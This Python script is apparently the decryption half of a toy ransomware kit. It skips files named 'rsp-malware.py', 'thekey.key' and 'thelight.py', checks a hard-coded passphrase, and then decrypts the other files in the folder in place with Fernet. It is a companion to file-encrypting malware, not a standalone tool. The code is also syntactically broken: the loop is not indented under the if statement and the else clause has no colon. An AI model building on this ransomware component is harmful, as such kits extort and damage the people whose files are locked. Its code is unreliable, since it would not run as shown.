#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

#function listing find file 
files = []
for file in os.listdir():
        if file == "rsp-malware.py" or file == "thekey.key" or file == "thelight.py":
                continue
        files.append(file)
print(files)

with open("thekey.key", "rb") as key:
        secretkey = key.read()

secretphrase = "slebewkang"
user_phrase = input("Enter the key to decrypt your files \n")
if user_phrase == secretphrase: 

for file in files:
        with open(file, "rb") as thefile:
                contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
                thefile.write(contents_decrypted)
        print("congrats, your files are decrypted, enjoy your file")
else
    print ("sorry, wrong secret phrase.")
